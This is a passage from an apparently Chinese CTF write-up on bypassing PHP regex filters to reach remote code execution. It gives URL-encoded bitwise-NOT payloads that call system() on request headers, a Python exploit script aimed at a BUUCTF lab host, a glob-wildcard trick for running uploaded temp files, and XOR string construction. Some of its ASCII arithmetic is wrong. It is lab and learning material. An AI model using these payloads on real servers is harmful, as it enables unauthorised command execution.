cmd=[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</code></pre>
<p>ua头输入ls /查看flag所在地</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019213556468.png" alt="image-20231019213556468"></p>
<p>找到flag</p>
<pre><code class="hljs plaintext">原型为: system(next(getallheaders()))

cmd=[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</code></pre>
<p>ua头输入cat /flag所在地flll1114gggggg</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019213805874.png" alt="image-20231019213805874"></p>
<p>拿到flag，麻烦的点在于每次bp抓包都要重新爆破一下验证码，不过有个佬写出了exp，可以全自动，如下</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> sys


url = <span class="hljs-string">'http://01bca480-d4fd-4597-a13a-a9829e724683.node4.buuoj.cn:81/'</span>

session = requests.session()
<span class="hljs-comment"># 1 md5 解码</span>
r = session.get(
    url=url,
)
md5_value = re.findall(<span class="hljs-string">r'if:substr\(md5\(\$code\),0,5\)==(.+?)"'</span>, r.text)[<span class="hljs-number">0</span>]
code = <span class="hljs-string">''</span>


<span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">s</span>):
    <span class="hljs-keyword">return</span> hashlib.md5(s.encode()).hexdigest()


<span class="hljs-keyword">def</span> <span class="hljs-title function_">demd5</span>(<span class="hljs-params">code</span>):<span class="hljs-comment">#爆破md5</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">9999999</span>):
        <span class="hljs-keyword">if</span> md5(<span class="hljs-built_in">str</span>(i)).startswith(code):
            <span class="hljs-built_in">print</span>(<span class="hljs-string">'[*]code:'</span>, i)
            code = i
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">return</span> code

code = demd5(md5_value)

<span class="hljs-comment"># 2 发送payload</span>
cmd = <span class="hljs-string">'[~%89%9E%8D%A0%9B%8A%92%8F][~%CF]([~%91%9A%87%8B][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]()));'</span>
raw_data = <span class="hljs-string">f'code=<span class="hljs-subst">{code}</span>&amp;cmd=<span class="hljs-subst">{cmd}</span>'</span>
r = session.post(
    url=url,
    data=raw_data,
    allow_redirects=<span class="hljs-literal">False</span>,
    headers={
        <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/x-www-form-urlencoded'</span>,
        <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'tac /*'</span>, <span class="hljs-comment"># 执行的代码</span>
    }
)
<span class="hljs-built_in">print</span>(<span class="hljs-string">'[*]'</span>, r.text)

<span class="hljs-comment"># phpinfo(): [~%8F%97%8F%96%91%99%90][~%CF]();</span>

<span class="hljs-comment">#查看shell在第几个：</span>
<span class="hljs-comment"># var_dump(getallheaders())： [~%89%9E%8D%A0%9B%8A%92%8F][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]());</span>

<span class="hljs-comment">#返回shell</span>
<span class="hljs-comment"># var_dump(next(getallheaders())): [~%89%9E%8D%A0%9B%8A%92%8F][~%CF]([~%91%9A%87%8B][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]()));</span>

<span class="hljs-comment">#执行shell</span>
<span class="hljs-comment"># system(next(getallheaders())): [~%8C%86%8C%8B%9A%92][~%CF]([~%91%9A%87%8B][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]()));</span></code></pre>
<p>这里呢在跟着wp学习一下上述payload的构造原理：</p>
<p>上述payload中采用!%EF的原因在于下列解释</p>
<pre><code class="hljs php">php -r <span class="hljs-string">"echo [1,2][0];"</span>
返回<span class="hljs-number">1</span>
把他看成一个数组，然后取下标为<span class="hljs-number">0</span>的内容，由于这里不能用()，所以改成了[][<span class="hljs-number">0</span>]，不过<span class="hljs-number">0</span>不过滤了，改成!%FF，%FF为True，加了感叹号变成了False

测试
php -r <span class="hljs-string">"echo [1,2][False];"</span>
返回<span class="hljs-number">1</span></code></pre>
<p>这里false代表的是0，true肯定就是代表1</p>
<p>故此<code>[phpinfo][0]=[phpinfo][!%FF]</code>代表的就是phpinfo，而%FF肯定不是0，但在!之下就是0了，而这里用数组去表示原因在于，题目给的第二个正则过滤了括号</p>
<p>这里我又对第一个正则产生了疑问，他不是会检测传入内容是否包含数字字母吗，但我传入的虽然是编码的，但显然有数字，之后测试了一番发现，如果传入类似上述payload（经过url编码的）不论是get还是post传参，都会经过url解码，而最终出现的都是不可见字符，因此完全不会被正则所匹配到。</p>
<p>但至于上述的~%CF或者是~%EF我还是不理解是什么意思，wp给出的解释是：</p>
<pre><code class="hljs plaintext">加这个[~%CF]只是因为php7的解析方式，当然换成其他的也可以例如[~%EF]</code></pre>
<p>我尝试解码发现也是一些特殊字符，不过还是没有理解在此的含义，我感觉还是!%FF好理解，不过这里就先记录吧，希望日后可以有所解惑</p>
<p>好过了几分钟我又来了，多亏我不懈的思考终于有所解惑，这里我一直使用的hackbar进行的传参，发现总是不成功，但如果使用明文字符phpinfo就可以，接着我突然想到用bp试试</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231020185935362.png" alt="image-20231020185935362"></p>
<p>如上图，竟然成功了，接着看到刚抓包的时候发现如下图</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231020190028402.png" alt="image-20231020190028402"></p>
<p>我们cmd的内容被url编码了，而我们又是post传参，服务器是不会自动去解码的（也就是两次解码）故此我们需要bp传上去，接着我尝试换成get传参（用hackbar）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231020190303241.png" alt="image-20231020190303241"></p>
<p>如上图成功了，这验证了我们之前的想法。nice！！！</p>
<h2 id="无参rce构造思想">无参RCE构造思想：</h2>
<p>p神是根据如下代码进行的思考：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'code'</span>])){
    <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'code'</span>];
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">35</span>){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"Long."</span>);
    }
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/[A-Za-z0-9_$]+/"</span>,<span class="hljs-variable">$code</span>)){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"NO."</span>);
    }
    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);
}<span class="hljs-keyword">else</span>{
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}</code></pre>
<h3 id="php7下">PHP7下</h3>
<p>php7中修改了表达式执行的顺序：<a target="_blank" rel="noopener" href="http://php.net/manual/zh/migration70.incompatible.php">http://php.net/manual/zh/migration70.incompatible.php</a> ：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019215144978.png" alt="image-20231019215144978"></p>
<p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>('phpinfo')();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p>
<p>所以很简单了，构造一个可以生成<code>phpinfo</code>这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：</p>
<pre><code class="hljs plaintext">(~%8F%97%8F%96%91%99%90)();</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019215318246.png" alt="image-20231019215318246"></p>
<h3 id="php5下-p神的顶尖思路注重p神的思考方式">PHP5下-p神的顶尖思路（注重p神的思考方式）</h3>
<p>好吧，这里我跟着p神是能看懂，但这里就不复现了，我直接不要脸了（bushi借用p神图片</p>
<p>首先p神对PHP5的getshell进行了思考：</p>
<p>我们使用<code>docker run --rm -p 9090:80 -v </code>pwd<code>:/var/www/html php:5.6-apach</code>来运行一个php5.6的web环境。</p>
<p>此时，我们尝试用PHP7的payload，将会得到一个错误：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019215956586.png" alt="image-20231019215956586"></p>
<p>原因就是php5并不支持这种表达方式。</p>
<pre><code class="hljs plaintext">p神思考：

在我在知识星球里发出帖子的时候，其实还没想到如何用PHP5解决问题，但我有自信解决它，所以先发了这个小挑战。后来关上电脑仔细想想，发现当思路禁锢在一个点的时候，你将会钻进牛角尖；当你用大局观来看待问题，问题就迎刃而解。

当然，我觉得我的方法应该不是唯一的，不过一直没人出来公布答案，我就先抛钻引玉了。

大部分语言都不会是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互。操作系统里包含的最重要的两个功能就是“shell（系统命令）”和“文件系统”，很多木马与远控其实也只实现了这两个功能。

PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？</code></pre>
<p>于是他想到了php+shell打破禁锢</p>
<p>因为反引号不属于“字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、<code>$</code>的系统命令来getshell？</p>
<p>好像问题又回到了原点：无字母、数字、<code>$</code>，在shell中仍然是一个难题。</p>
<p>此时我想到了两个有趣的Linux shell知识点：</p>
<ol>
<li>shell下可以利用<code>.</code>来执行任意脚本</li>
<li>Linux文件名支持用glob通配符代替</li>
</ol>
<p>第一点曾在《 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html">小密圈里的那些奇技淫巧</a> 》露出过一角，但我没细讲。<code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</p>
<p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p>
<p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p>
<p>第二个难题接踵而至，执行<code>. /tmp/phpXXXXXX</code>，也是有字母的。此时就可以用到Linux下的glob通配符：</p>
<ul>
<li><code>*</code>可以代替0个及以上任意字符</li>
<li><code>?</code>可以代表1个任意字符</li>
</ul>
<p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p>
<p>但我们尝试执行<code>. /???/?????????</code>，却得到如下错误：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019220052718.png" alt="image-20231019220052718"></p>
<p>这是因为，能够匹配上<code>/???/?????????</code>这个通配符的文件有很多，我们可以列出来：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019220102512.png" alt="image-20231019220102512"></p>
<p>可见，我们要执行的<code>/tmp/phpcjggLC</code>排在倒数第二位。然而，在执行第一个匹配上的文件（即<code>/bin/run-parts</code>）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p>
<p>思路又陷入了僵局，虽然方向没错。</p>
<p>于是p神又开始深入理解glob通配符（翻阅linux文档）</p>
<p>大部分同学对于通配符，可能知道的都只有<code>*</code>和<code>?</code>。但实际上，阅读Linux的文档（ <a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man7/glob.7.html">http://man7.org/linux/man-pages/man7/glob.7.html</a> ），可以学到更多有趣的知识点。</p>
<p>其中，glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉<code>/bin/run-parts</code>：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019220148448.png" alt="image-20231019220148448"></p>
<p>排除了第4个字符是<code>-</code>的文件，同样我们可以排除包含<code>.</code>的文件：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019220158628.png" alt="image-20231019220158628"></p>
<p>现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。</p>
<p>继续阅读glob的帮助，我发现另一个有趣的用法：就跟正则表达式类似，glob支持利用<code>[0-9]</code>来表示一个范围。</p>
<p>我们再来看看之前列出可能干扰我们的文件：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019220217535.png" alt="image-20231019220217535"></p>
<p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p>
<p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019220230330.png" alt="image-20231019220230330"></p>
<p>那么，我们可以利用<code>[@-[]</code>来表示大写字母：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019220237026.png" alt="image-20231019220237026"></p>
<p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p>
<p>最后，我传入的code为<code>?&gt;&lt;?=</code>. /???/???[@-[]<code>;?&gt;</code>，发送数据包如下：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019220251334.png" alt="image-20231019220251334"></p>
<p>成功执行任意命令。</p>
<h1 id="0x07-ff以及xor的思考">0x07 %FF以及XOR的思考</h1>
<p>这里对于上述payload的构造仍有诸多疑问，故此搜了许多文章在此学习一波。</p>
<h2 id="71-php异或流程">7.1 PHP异或流程</h2>
<p>在PHP中，两个变量的值进行异或时，会先将两个变量的值转换为ASCII，再将ASCII转换为<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E4%BA%8C%E8%BF%9B%E5%88%B6&amp;spm=1001.2101.3001.7020">二进制</a>，对两对二进制数据进行异或，异或完，再将结果转为ASCII，最后将ASCII转为字符串，即为最终结果。</p>
<h2 id="72-异或运算法则">7.2 异或运算法则</h2>
<p>0&amp;0=0；1&amp;1=0；0&amp;1=1；1&amp;0=1</p>
<p>两个二进制数相同时，异或为0，不同为1</p>
<p>例：php中的字符串A和字符串?</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">"A"</span>^<span class="hljs-string">"?"</span>;
<span class="hljs-comment">//输出：~</span>
<span class="hljs-comment">/*</span>
<span class="hljs-comment">(1)</span>
<span class="hljs-comment">A的ASCII值：65</span>
<span class="hljs-comment">?的ASCII值：77</span>
<span class="hljs-comment">(2)</span>
<span class="hljs-comment">65转为二进制：1000001</span>
<span class="hljs-comment">90转为二进制：0111111</span>
<span class="hljs-comment">(3)</span>
<span class="hljs-comment">二进制异或结果：1111110</span>
<span class="hljs-comment">二进制转为ASCII:126</span>
<span class="hljs-comment">ASCII转为字符串：~</span>
<span class="hljs-comment">*/</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>利用异或制作php执行代码：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"&lt;"</span>^<span class="hljs-string">"a"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"?"</span>^<span class="hljs-string">"d"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"p"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"h"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"p"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">" "</span>^<span class="hljs-string">"a"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"s"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"y"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"s"</span>^<span class="hljs-string">"2"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"t"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"e"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"m"</span>^<span class="hljs-string">"6"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"("</span>^<span class="hljs-string">"a"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"'"</span>^<span class="hljs-string">"a"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"l"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"s"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"'"</span>^<span class="hljs-string">"a"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">")"</span>^<span class="hljs-string">"a"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">";"</span>^<span class="hljs-string">"a"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"?"</span>^<span class="hljs-string">"b"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"&gt;"</span>^<span class="hljs-string">"c"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;

<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br/&gt;"</span>;

<span class="hljs-keyword">echo</span> (<span class="hljs-string">"]"</span>^<span class="hljs-string">"a"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"["</span>^<span class="hljs-string">"d"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"A"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"Y"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"A"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"A"</span>^<span class="hljs-string">"a"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"B"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"H"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"A"</span>^<span class="hljs-string">"2"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"E"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"T"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"["</span>^<span class="hljs-string">"6"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"I"</span>^<span class="hljs-string">"a"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"F"</span>^<span class="hljs-string">"a"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"]"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"B"</span>^<span class="hljs-string">"1"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"F"</span>^<span class="hljs-string">"a"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"H"</span>^<span class="hljs-string">"a"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"Z"</span>^<span class="hljs-string">"a"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"]"</span>^<span class="hljs-string">"b"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> (<span class="hljs-string">"]"</span>^<span class="hljs-string">"c"</span>).<span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-comment">/*输出</span>
<span class="hljs-comment">]</span>
<span class="hljs-comment">[</span>
<span class="hljs-comment">A</span>
<span class="hljs-comment">Y</span>
<span class="hljs-comment">A</span>
<span class="hljs-comment">A</span>
<span class="hljs-comment">B</span>
<span class="hljs-comment">H</span>
<span class="hljs-comment">A</span>
<span class="hljs-comment">E</span>
<span class="hljs-comment">T</span>
<span class="hljs-comment">[</span>
<span class="hljs-comment">I</span>
<span class="hljs-comment">F</span>
<span class="hljs-comment">]</span>
<span class="hljs-comment">B</span>
<span class="hljs-comment">F</span>
<span class="hljs-comment">H</span>
<span class="hljs-comment">Z</span>
<span class="hljs-comment">]</span>
<span class="hljs-comment">]</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">&lt;</span>
<span class="hljs-comment">?</span>
<span class="hljs-comment">p</span>
<span class="hljs-comment">h</span>
<span class="hljs-comment">p</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">s</span>
<span class="hljs-comment">y</span>
<span class="hljs-comment">s</span>
<span class="hljs-comment">t</span>
<span class="hljs-comment">e</span>
<span class="hljs-comment">m</span>
<span class="hljs-comment">(</span>
<span class="hljs-comment">'</span>
<span class="hljs-comment">l</span>
<span class="hljs-comment">s</span>
<span class="hljs-comment">'</span>
<span class="hljs-comment">)</span>
<span class="hljs-comment">;</span>
<span class="hljs-comment">?</span>
<span class="hljs-comment">&gt;</span>
<span class="hljs-comment">*/</span>

